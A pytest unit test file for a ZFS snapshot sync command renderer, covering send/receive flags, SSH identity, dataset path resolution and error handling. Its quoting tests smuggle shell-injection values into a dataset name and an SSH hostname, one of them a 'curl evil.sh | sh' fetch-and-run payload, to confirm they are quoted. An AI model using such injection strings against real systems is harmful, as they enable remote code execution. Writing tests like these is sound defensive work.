"""Unit tests for the sync command renderer."""

from datetime import datetime, timezone
from uuid import uuid4

import pytest

from zfs_sync.services.sync.renderer import (
    CommandRenderError,
    dataset_path,
    render_sync_command,
    ssh_prefix,
)
from zfs_sync.services.sync.types import SyncAction, SyncDecision, SystemRef


def decision(**overrides) -> SyncDecision:
    """A renderable incremental decision, with fields overridable per test."""
    defaults = {
        "sync_group_id": uuid4(),
        "dataset": "DATA1",
        "source": SystemRef(id=uuid4(), hostname="hub1", ssh_hostname="hub1-san"),
        "target": SystemRef(id=uuid4(), hostname="spoke1", ssh_hostname="spoke1-san"),
        "action": SyncAction.SYNC,
        "source_pool": "hubpool1",
        "target_pool": "spokepool1",
        "starting_snapshot": "2025-01-02-000000",
        "ending_snapshot": "2025-01-20-000000",
        "ending_timestamp": datetime(2025, 1, 20, tzinfo=timezone.utc),
        "full_send": False,
    }
    defaults.update(overrides)
    return SyncDecision(**defaults)


class TestIncrementalRendering:
    def test_the_whole_command(self):
        assert render_sync_command(decision()) == (
            "zfs send -c -I hubpool1/DATA1@2025-01-02-000000 "
            "hubpool1/DATA1@2025-01-20-000000 "
            "| ssh spoke1-san 'zfs receive -s spokepool1/DATA1'"
        )

    def test_the_base_precedes_the_end(self):
        command = render_sync_command(decision())
        send = command.split("|")[0]

        assert send.index("@2025-01-02-000000") < send.index("@2025-01-20-000000")

    def test_uses_capital_i_to_include_intermediate_snapshots(self):
        command = render_sync_command(decision())

        assert " -I " in command
        assert " -i " not in command

    def test_source_and_target_pools_land_in_the_right_places(self):
        command = render_sync_command(decision())
        send, receive = command.split("|")

        assert "hubpool1/DATA1" in send
        assert "spokepool1" not in send
        assert "spokepool1/DATA1" in receive
        assert "hubpool1" not in receive


class TestFullSendRendering:
    def test_omits_the_incremental_flag_and_base(self):
        command = render_sync_command(
            decision(starting_snapshot=None, full_send=True, target_pool=None)
        )

        assert command == (
            "zfs send -c hubpool1/DATA1@2025-01-20-000000 "
            "| ssh spoke1-san 'zfs receive -s hubpool1/DATA1'"
        )

    def test_a_target_with_no_pool_yet_mirrors_the_source_pool(self):
        command = render_sync_command(decision(target_pool=None))

        assert "zfs receive -s hubpool1/DATA1" in command


class TestSshIdentity:
    """The identity the previous builder discarded."""

    def test_a_user_is_included(self):
        command = render_sync_command(
            decision(
                target=SystemRef(
                    id=uuid4(),
                    hostname="spoke1",
                    ssh_hostname="spoke1-san",
                    ssh_user="backup",
                )
            )
        )

        assert "ssh backup@spoke1-san" in command

    def test_a_non_default_port_is_included(self):
        command = render_sync_command(
            decision(
                target=SystemRef(
                    id=uuid4(),
                    hostname="spoke1",
                    ssh_hostname="spoke1-san",
                    ssh_user="backup",
                    ssh_port=2222,
                )
            )
        )

        assert "ssh -p 2222 backup@spoke1-san" in command

    def test_port_22_is_left_implicit(self):
        command = render_sync_command(decision())

        assert "-p" not in command
        assert "ssh spoke1-san" in command

    def test_ssh_prefix_pieces(self):
        assert ssh_prefix("host") == ["ssh", "host"]
        assert ssh_prefix("host", "user") == ["ssh", "user@host"]
        assert ssh_prefix("host", "user", 2222) == ["ssh", "-p", "2222", "user@host"]


class TestDatasetPathResolution:
    """One place resolves pool/dataset, rather than seven scattered checks."""

    def test_a_bare_dataset_gains_its_pool(self):
        assert dataset_path("tank", "DATA1") == "tank/DATA1"

    def test_an_already_qualified_dataset_is_not_double_prefixed(self):
        assert dataset_path("tank", "tank/DATA1") == "tank/DATA1"

    def test_a_nested_dataset_without_its_pool_still_gains_it(self):
        """The case the old heuristic got wrong.

        `if "/" in dataset` treated "data/sub" as already qualified and
        rendered it without the pool.
        """
        assert dataset_path("tank", "data/sub") == "tank/data/sub"

    def test_a_nested_dataset_with_its_pool_is_left_alone(self):
        assert dataset_path("tank", "tank/data/sub") == "tank/data/sub"

    def test_a_dataset_named_like_the_pool_is_not_prefixed(self):
        assert dataset_path("tank", "tank") == "tank"

    def test_a_similarly_named_pool_is_not_mistaken_for_a_prefix(self):
        assert dataset_path("tank", "tank2/DATA1") == "tank/tank2/DATA1"

    def test_a_missing_pool_is_an_error(self):
        with pytest.raises(CommandRenderError):
            dataset_path("", "DATA1")

    def test_rendering_uses_the_same_resolution(self):
        command = render_sync_command(decision(dataset="hubpool1/DATA1"))

        assert "hubpool1/hubpool1" not in command
        assert "hubpool1/DATA1@2025-01-20-000000" in command


class TestQuoting:
    def test_a_dataset_containing_a_separator_cannot_run_a_second_command(self):
        """The payload must be one argument, not a command separator.

        Asserted structurally: shlex parses the send half the way a shell
        would, so a payload that survives as a single token cannot execute.
        """
        import shlex

        command = render_sync_command(decision(dataset="DATA1; touch /tmp/pwned"))
        send_half = command.split(" | ")[0]

        tokens = shlex.split(send_half)

        assert tokens[:3] == ["zfs", "send", "-c"]
        assert "touch" not in tokens, f"payload became its own token: {tokens}"
        # It survives only inside the snapshot arguments, as literal text.
        snapshot_args = [t for t in tokens if "@" in t]
        assert len(snapshot_args) == 2
        assert all("; touch /tmp/pwned@" in t for t in snapshot_args)

    def test_an_injectable_ssh_host_is_quoted(self):
        command = render_sync_command(
            decision(
                target=SystemRef(
                    id=uuid4(),
                    hostname="spoke1",
                    ssh_hostname="spoke1-san; curl evil.sh | sh",
                )
            )
        )

        assert "'spoke1-san; curl evil.sh | sh'" in command

    def test_ordinary_values_are_not_quoted(self):
        command = render_sync_command(decision())

        assert "'hubpool1" not in command
        assert "ssh spoke1-san" in command


class TestReceiveFlags:
    def test_resumable_by_default(self):
        assert "zfs receive -s" in render_sync_command(decision())

    def test_rollback_is_off_by_default(self):
        """-F discards target changes, so it is never implicit."""
        assert "-F" not in render_sync_command(decision())

    def test_rollback_can_be_requested(self):
        command = render_sync_command(decision(), force_rollback=True)

        assert "zfs receive -F -s" in command

    def test_compression_can_be_disabled(self):
        command = render_sync_command(decision(), compressed=False)

        assert command.startswith("zfs send -I ")

    def test_resumability_can_be_disabled(self):
        command = render_sync_command(decision(), resumable=False)

        assert "zfs receive spokepool1/DATA1" in command


class TestUnrenderableDecisions:
    """The renderer refuses rather than emitting something broken."""

    def test_a_skip_decision(self):
        with pytest.raises(CommandRenderError, match="not a sync"):
            render_sync_command(decision(action=SyncAction.SKIP))

    def test_a_target_without_an_ssh_hostname(self):
        with pytest.raises(CommandRenderError, match="no ssh_hostname"):
            render_sync_command(
                decision(target=SystemRef(id=uuid4(), hostname="spoke1", ssh_hostname=None))
            )

    def test_identical_start_and_end(self):
        with pytest.raises(CommandRenderError, match="nothing to send"):
            render_sync_command(decision(starting_snapshot="2025-01-20-000000"))

    def test_a_missing_ending_snapshot(self):
        with pytest.raises(CommandRenderError, match="ending snapshot"):
            render_sync_command(decision(ending_snapshot=None))

    def test_a_missing_source_pool(self):
        with pytest.raises(CommandRenderError, match="source pool"):
            render_sync_command(decision(source_pool=None))


class TestRenderingPlannerOutput:
    """The renderer consumes what the planner produces, unmodified."""

    def test_every_planned_instruction_renders(self, test_db):
        from zfs_sync.database.repositories import (
            SnapshotRepository,
            SyncGroupRepository,
            SystemRepository,
        )
        from zfs_sync.services.sync.planner import SyncPlanner

        systems = SystemRepository(test_db)
        groups = SyncGroupRepository(test_db)
        snapshots = SnapshotRepository(test_db)

        hub = systems.create(
            hostname="hub1", platform="linux", connectivity_status="online",
            ssh_hostname="hub1-san",
        )
        spokes = []
        for index, (hostname, pool, stopped) in enumerate(
            [("spoke1", "spokepool1", 2), ("spoke2", "spokepool2", 5)]
        ):
            spoke = systems.create(
                hostname=hostname, platform="linux", connectivity_status="online",
                ssh_hostname=f"{hostname}-san", ssh_user="backup", ssh_port=2222 + index,
            )
            for number in range(1, stopped + 1):
                snapshots.create(
                    name=f"{pool}/DATA1@2025-01-{number:02d}-000000",
                    pool=pool, dataset="DATA1",
                    timestamp=datetime(2025, 1, number, tzinfo=timezone.utc),
                    size=1024, system_id=spoke.id,
                )
            spokes.append(spoke)

        for number in range(1, 21):
            snapshots.create(
                name=f"hubpool1/DATA1@2025-01-{number:02d}-000000",
                pool="hubpool1", dataset="DATA1",
                timestamp=datetime(2025, 1, number, tzinfo=timezone.utc),
                size=1024, system_id=hub.id,
            )

        group = groups.create(name="render", directional=True, hub_system_id=hub.id)
        groups.add_system(group.id, hub.id)
        for spoke in spokes:
            groups.add_system(group.id, spoke.id)

        plan = SyncPlanner(test_db).plan_group(
            group.id, now=datetime(2025, 2, 1, tzinfo=timezone.utc)
        )
        commands = [render_sync_command(d) for d in plan.instructions]

        assert len(commands) == 2
        assert "ssh -p 2222 backup@spoke1-san" in commands[0]
        assert "ssh -p 2223 backup@spoke2-san" in commands[1]
        # Each target receives into its own pool, from its own base.
        assert "@2025-01-02-000000" in commands[0]
        assert "@2025-01-05-000000" in commands[1]
        assert "spokepool1/DATA1" in commands[0]
        assert "spokepool2/DATA1" in commands[1]
